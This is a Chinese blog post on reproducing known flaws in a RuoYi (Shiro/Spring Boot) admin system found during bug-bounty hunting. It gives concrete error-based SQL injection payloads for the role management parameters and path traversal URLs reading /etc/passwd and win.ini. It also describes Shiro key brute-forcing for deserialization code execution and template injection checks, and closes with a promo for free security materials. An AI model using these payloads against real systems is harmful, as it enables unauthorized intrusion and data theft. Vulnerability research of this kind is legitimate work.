# 原创
：  实战Src对ruoyi框架管理系统漏洞的复现

# 实战Src对ruoyi框架管理系统漏洞的复现

### 前言：

在挖src的时候，搜搜有没有后台弱口令能进去的：

<br/> 发现一个弱口令进去后：

<br/> 【这个蓝色的草丛居然堪比算是ruoyi的指纹】<br/>  

<br/> 看这界面，是不是很像ruoyi<br/> 插件一看：

<br/> 前端vue.js

加上登录的cookie rememberMe：

<br/> 【登录失败时bp抓包相应包有remeberMe=delete】<br/> 得知登录为shiro框架<br/> 八九不离十后台就是ruoyi框架的管理系统了

### 若依管理系统简介

若依管理系统（Ruoyi Admin System）是一款基于Java开发的开源后台管理系统，若依管理系统采用前后端分离架构，前端使用Vue.js框架，后端使用Spring Boot框架。<br/> 找了个ruoyi系统的例图如下：

### 漏洞一：若依前台默认shiro key命令执行漏洞

漏洞简介<br/> 若依默认使用shiro组件，所以可以试试shiro经典的反序列化 rememberMe漏洞来getshell。<br/> 直接工具一搜哈：

直接先爆破密钥，成功了血赚，失败了不亏，还有其他方法能得到AES的key<br/> 工具二搜哈：<br/> 【url和cookie配置好就直接搜哈】

<br/> 这里发现了很多的漏洞：<br/> [+] 存在Snakeyaml命令执行漏洞<br/> [+] 存在JdbcTemplate漏洞<br/> [+] 存在ReadFile(新)文件读取漏洞<br/> [+] 存在ReadFile(老)文件读取漏洞<br/> [+] 存在Thymeleaf模板注入漏洞<br/> [+] 存在SQL(1)注入漏洞<br/> [+] 存在SQL(2)注入漏洞<br/> [+] 存在SQL(3)注入漏洞<br/> [+] 存在Shiro框架<br/> [+] 存在默认key:xxxxx<br/> 我们先针对shiro框架：<br/> 拿着key去工具一：

然后检测利用链，检测成功后就可以命令执行getshell了：

### 漏洞二：若依后台存在多处sql注入漏洞

##### 第一处：

<br/> 角色管理的搜索，bp拦截抓包：

<br/> poc：<br/> pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=&amp;params[beginTime]=&amp;params[endTime]=&amp;params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))<br/> 报错注入回显database（）：

<br/> poc2：<br/> pageSize=&amp;pageNum=&amp;orderByColumn=&amp;isAsc=&amp;roleName=&amp;roleKey=&amp;status=¶ms[beginTime]=¶ms[endTime]=¶ms[dataScope]=and extractvalue(1,concat(0x7e,(select table_schema from information_schema.tables limit 0,1),0x7e))

<br/> 爆到库名点到为止

##### 第二处：

<br/> 也是角色管理，在导出这里<br/> poc：<br/> params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e))

##### 或者直接使用工具二

### 漏洞三：若依后台任意文件读取（CNVD-2021-01931）

直接get访问：<br/> /common/download/resource?resource=/profile/../../../../etc/passwd<br/> /common/download/resource?resource=/profile/../../../../Windows/win.ini

### 漏洞四：若依后台定时任务RCE

没有公网vps，无法复现

### 漏洞五：Thymeleaf模板注入漏洞

用工具二 ping+dnslog验证：

### 还有漏洞复现望补充

## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/direct/2720c1c870a0461a8790114b71b7e915.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/direct/7a5378a766254936a4be61f2ad09c55e.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/direct/618df45d97944094bc27383d9669853d.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/direct/2ce5358efa334798988448beb76e20b5.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/direct/66592979f4b44987aa00dc1ccf585eeb.png" width="665"/>

应急响应笔记

学习路线

 
